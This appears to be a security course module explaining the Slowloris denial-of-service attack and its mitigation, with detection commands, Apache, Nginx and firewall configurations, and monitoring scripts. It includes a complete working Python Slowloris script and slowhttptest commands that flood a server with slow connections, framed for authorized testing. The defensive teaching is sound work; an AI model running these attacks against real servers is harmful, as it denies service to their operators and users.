---
tags:
  - security:security
  - security:cyber-attacks
  - security:penetration-testing
  - security:vulnerabilities
level: intermediate
category: security
audience:
  - audiences:developers
  - audiences:security-professionals

---

# Slowloris Attack and Mitigation

---
## What is Slowloris Attack

- Slowloris is a type of Denial of Service (DoS) attack that targets web servers
- It works by opening multiple HTTP connections to the target server and keeping them open as long as possible
- This consumes all available connections/threads on the server, making it unable to serve legitimate requests
- Named after the slow loris primate, which moves very slowly
- Created by Robert "RSnake" Hansen in 2009
- Requires very low bandwidth compared to volumetric DDoS attacks

---
## How HTTP Connections Normally Work

```bash
┌─────────────────────────────────────────────────────────┐
│              Normal HTTP Request Flow                     │
│                                                          │
│  Client                            Server                │
│    │                                  │                   │
│    │  GET /index.html HTTP/1.1        │                   │
│    │  Host: example.com               │                   │
│    │  Connection: keep-alive          │                   │
│    │  <blank line = end of headers>   │                   │
│    │─────────────────────────────────>│                   │
│    │                                  │  Process request  │
│    │  HTTP/1.1 200 OK                 │                   │
│    │  Content-Type: text/html         │                   │
│    │  <response body>                 │                   │
│    │<─────────────────────────────────│                   │
│    │                                  │  Connection freed │
└─────────────────────────────────────────────────────────┘
```

- The server waits for the complete request (ending with a blank line)
- Once received, it processes and responds
- The connection slot is then freed for other clients

---

## How Slowloris Works

![how_slowloris_works](svg/courses/security/cyber-attacks-and-vectors/16_slowloris/how_slowloris_works.svg)

---

## How Slowloris Works

- The attacker sends partial HTTP headers, never completing the request
- Periodically sends additional header bytes to keep connections alive
- Server keeps each connection open waiting for the request to finish
- With enough connections, the server cannot accept legitimate clients

---
## Slowloris Step by Step

1. **Open connections**: Attacker opens hundreds of connections to the target
1. **Send partial headers**: Each connection sends an incomplete HTTP request
1. **Keep alive**: Periodically send additional headers to prevent timeout
1. **Exhaust pool**: Server connection pool fills up completely
1. **Deny service**: Legitimate users receive connection refused errors

---
## Why Slowloris is Effective

| Characteristic       | Slowloris              | Volumetric DDoS         |
|----------------------|------------------------|-------------------------|
| Bandwidth required   | Very low (< 1 Mbps)   | High (Gbps - Tbps)      |
| Packets per second   | Very few               | Millions                 |
| Detection difficulty | Hard                   | Easier (volume spikes)   |
| Single machine       | Can be effective       | Requires botnet          |
| Target               | Application layer      | Network layer            |
| Cost to attacker     | Nearly free            | Expensive infrastructure |

---
## Python Implementation for Testing

```python
#!/usr/bin/env python3
"""
Slowloris demonstration script - FOR AUTHORIZED TESTING ONLY
Only use against systems you own or have explicit permission to test.
"""

import socket
import time
import random
import threading

TARGET_HOST = "your-test-server.local"
TARGET_PORT = 80
NUM_SOCKETS = 200
KEEP_ALIVE_INTERVAL = 15  # seconds

def create_socket():
    """Create a socket and send partial HTTP headers."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((TARGET_HOST, TARGET_PORT))
    # Send partial HTTP request (no terminating blank line)
    s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
    s.send(f"Host: {TARGET_HOST}\r\n".encode())
    s.send("User-Agent: Mozilla/5.0\r\n".encode())
    s.send("Accept: text/html\r\n".encode())
    return s

def slowloris_attack():
    sockets_list = []

    # Phase 1: Open initial connections
    print(f"[*] Opening {NUM_SOCKETS} connections...")
    for _ in range(NUM_SOCKETS):
        try:
            s = create_socket()
            sockets_list.append(s)
        except Exception as e:
            print(f"[-] Failed to create socket: {e}")

    print(f"[+] {len(sockets_list)} sockets connected")

    # Phase 2: Keep connections alive
    while True:
        print(f"[*] Sending keep-alive headers... "
              f"({len(sockets_list)} active)")
        for s in list(sockets_list):
            try:
                # Send additional header to keep connection open
                header = f"X-a: {random.randint(1, 5000)}\r\n"
                s.send(header.encode())
            except Exception:
                sockets_list.remove(s)
                try:
                    s = create_socket()
                    sockets_list.append(s)
                except Exception:
                    pass

        time.sleep(KEEP_ALIVE_INTERVAL)
```

> WARNING: Only use this against systems you own or have written authorization to test.

---
## Slowloris Variants

| Variant            | Technique                                     | Target          |
|--------------------|-----------------------------------------------|-----------------|
| Slowloris          | Partial HTTP headers                          | HTTP servers    |
| Slow POST (RUDY)  | Sends POST body one byte at a time            | HTTP servers    |
| Slow Read          | Reads response very slowly (tiny TCP window)  | HTTP servers    |
| Apache Killer      | Overlapping Range headers                     | Apache httpd    |
| HashDoS            | Crafted parameters causing hash collisions    | App frameworks  |

---

## Slow POST (R.U.D.Y.) Attack

![slow_post_r_u_d_y_attack](svg/courses/security/cyber-attacks-and-vectors/16_slowloris/slow_post_r_u_d_y_attack.svg)

---

## Slow POST (R.U.D.Y.) Attack

- Declares a large Content-Length but sends the body extremely slowly
- Server must keep the connection open to receive the full body
- Even harder to detect than standard Slowloris

---
## Detecting Slowloris Attacks

### Using netstat and ss

```bash
# Count connections per IP address
netstat -ntu | awk '{print $5}' | cut -d: -f1 | \
    sort | uniq -c | sort -rn | head -20

# Using ss (modern replacement for netstat)
ss -tn state established | awk '{print $5}' | \
    cut -d: -f1 | sort | uniq -c | sort -rn | head -20

# Show connections in ESTABLISHED state to port 80
ss -tn state established '( dport = :80 )'

# Count connections per state
ss -s

# Watch connection count in real time
watch -n 1 'ss -tn state established | wc -l'
```

### Signs of Slowloris Attack
- Unusually high number of connections from a single IP or small range
- Many connections in ESTABLISHED state with little data transfer
- Server response time degrading while bandwidth utilization is low
- Connection count approaching server max without proportional traffic

---
## Detection with Server Logs

```bash
# Apache: Check for many connections with long duration
tail -f /var/log/apache2/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn

# Nginx: Monitor connection states
nginx -T 2>/dev/null | grep worker_connections

# Check for connections that have been open too long
# (requires custom logging or mod_status)
curl http://localhost/server-status?auto | \
    grep "Waiting\|Reading"
```

---

## Apache vs Nginx Resilience

| Feature                    | Apache (prefork/worker) | Nginx                    |
|----------------------------|------------------------|--------------------------|
| Connection model           | Thread per connection   | Event-driven (async)     |
| Default max connections    | 150-256                | 1024+ per worker         |
| Slowloris vulnerability    | HIGH                   | LOW                      |
| Resource per connection    | ~2-8 MB thread stack   | ~few KB per connection   |
| Idle connection cost       | Very expensive          | Very cheap               |
| Timeout handling           | Waits per thread       | Async timeout per event  |

---

## Apache vs Nginx Resilience

![apache_vs_nginx_resilience](svg/courses/security/cyber-attacks-and-vectors/16_slowloris/apache_vs_nginx_resilience.svg)

---
## Apache mod_reqtimeout Configuration

```apache
# /etc/apache2/mods-enabled/reqtimeout.conf
# (or httpd.conf on RHEL/CentOS)

# Enable the module
LoadModule reqtimeout_module modules/mod_reqtimeout.so

# Configure timeouts for request headers and body
<IfModule reqtimeout_module>
    # Header: 20 second initial timeout, then 40 bytes/sec minimum
    # Body: 20 second initial timeout, then 40 bytes/sec minimum
    RequestReadTimeout header=20-40,MinRate=500 body=20,MinRate=500
</IfModule>

# Additional protective settings
# Limit maximum number of connections per IP
<IfModule mod_limitipconn.c>
    MaxConnPerIP 10
</IfModule>

# Set keep-alive timeout low
KeepAliveTimeout 5
MaxKeepAliveRequests 100

# Reduce overall timeout
Timeout 30
```

```bash
# Enable the module on Debian/Ubuntu
sudo a2enmod reqtimeout
sudo systemctl restart apache2

# Verify module is loaded
apachectl -M | grep reqtimeout
```

---
## Nginx Configuration for Slowloris Defense

```nginx
# /etc/nginx/nginx.conf

http {
    # Limit connections per IP
    limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
    limit_conn conn_limit 20;

    # Limit request rate per IP
    limit_req_zone $binary_remote_addr zone=req_limit:10m rate=10r/s;
    limit_req zone=req_limit burst=20 nodelay;

    # Aggressive timeouts for slow clients
    client_header_timeout 10s;
    client_body_timeout 10s;
    send_timeout 10s;
    keepalive_timeout 15s;

    # Limit header and body sizes
    large_client_header_buffers 2 1k;
    client_max_body_size 10m;

    server {
        listen 80;

        location / {
            # Apply rate limiting
            limit_req zone=req_limit;
            limit_conn conn_limit;

            proxy_pass http://backend;
        }
    }
}
```

---
## Rate Limiting with iptables

```bash
# Limit new connections per IP (max 20 per minute)
iptables -A INPUT -p tcp --dport 80 \
    -m connlimit --connlimit-above 20 \
    --connlimit-mask 32 -j DROP

# Limit new connection rate
iptables -A INPUT -p tcp --dport 80 \
    -m state --state NEW \
    -m recent --set --name HTTP

iptables -A INPUT -p tcp --dport 80 \
    -m state --state NEW \
    -m recent --update --seconds 60 --hitcount 30 \
    --name HTTP -j DROP

# Using nftables (modern replacement)
nft add rule inet filter input \
    tcp dport 80 \
    meter http_limit { ip saddr limit rate 20/minute } \
    accept

nft add rule inet filter input \
    tcp dport 80 drop
```

---

## Reverse Proxy as a Defense Layer

![reverse_proxy_as_a_defense_layer](svg/courses/security/cyber-attacks-and-vectors/16_slowloris/reverse_proxy_as_a_defense_layer.svg)

---

## Reverse Proxy as a Defense Layer

- Place an event-driven reverse proxy (Nginx, HAProxy) in front of Apache
- The proxy absorbs slow connections efficiently
- Only complete, well-formed requests are forwarded to the backend
- This is the single most effective defense against Slowloris

---
## Cloud-Based Mitigation

| Service            | Feature                                  |
|--------------------|------------------------------------------|
| Cloudflare         | Automatic Slowloris protection at edge   |
| AWS ALB/CloudFront | Connection timeout and rate limiting     |
| Akamai             | Slow POST protection, connection limits  |
| Azure Front Door   | WAF rules for slow HTTP attacks          |

- Cloud CDN and WAF services sit in front of your origin server
- They handle thousands of concurrent connections efficiently
- Slow connections are terminated at the edge before reaching origin
- Often the simplest solution for production environments

---
## Testing Your Defenses

```bash
# Install slowhttptest (legitimate testing tool)
sudo apt install slowhttptest

# Test for Slowloris vulnerability
slowhttptest -c 1000 -H -g -o slowloris_test \
    -i 10 -r 200 -t GET -u http://your-server/ \
    -x 24 -p 3

# Test for Slow POST vulnerability
slowhttptest -c 1000 -B -g -o slow_post_test \
    -i 110 -r 200 -s 8192 -t POST \
    -u http://your-server/login -x 10 -p 3

# Flags explained:
#   -c 1000   : 1000 connections
#   -H        : Slowloris mode (slow headers)
#   -B        : Slow POST mode (slow body)
#   -i 10     : Interval between data sends (seconds)
#   -r 200    : Connection rate (per second)
#   -t GET    : HTTP method
#   -x 24     : Max length of follow-up data
#   -p 3      : Timeout to wait for response
```

---
## Monitoring and Alerting

```bash
#!/bin/bash
# Simple monitoring script for Slowloris-like attacks

THRESHOLD=50    # Max connections per IP
PORT=80
ALERT_EMAIL="admin@example.com"

while true; do
    # Get top connection counts per IP
    TOP_IPS=$(ss -tn state established "( dport = :${PORT} )" | \
        awk '{print $5}' | cut -d: -f1 | \
        sort | uniq -c | sort -rn | head -5)

    # Check if any IP exceeds threshold
    echo "$TOP_IPS" | while read COUNT IP; do
        if [ "$COUNT" -gt "$THRESHOLD" ]; then
            echo "[ALERT] $IP has $COUNT connections on port $PORT"
            # Optionally block the IP temporarily
            # iptables -A INPUT -s "$IP" -j DROP
        fi
    done

    sleep 10
done
```

---
## Defense Checklist

```bash
┌──────────────────────────────────────────────────────────┐
│          Slowloris Defense Checklist                      │
├──────────────────────────────────────────────────────────┤
│  [ ] Use event-driven web server (Nginx) or proxy       │
│  [ ] Configure request header/body timeouts             │
│  [ ] Set per-IP connection limits                       │
│  [ ] Enable rate limiting                               │
│  [ ] Deploy reverse proxy in front of Apache            │
│  [ ] Configure iptables/nftables connection limits      │
│  [ ] Set up monitoring and alerting                     │
│  [ ] Consider cloud-based WAF/CDN protection            │
│  [ ] Test defenses with slowhttptest                    │
│  [ ] Document incident response procedures              │
└──────────────────────────────────────────────────────────┘
```

---
## Key Takeaways

- Slowloris is a low-bandwidth, application-layer DoS attack
- It exploits the thread-per-connection model of servers like Apache
- Event-driven servers (Nginx) are naturally resilient
- Best defense: reverse proxy + timeouts + connection limits + rate limiting
- Regular testing with tools like slowhttptest validates your defenses
- Cloud WAF/CDN services provide the simplest production-grade protection
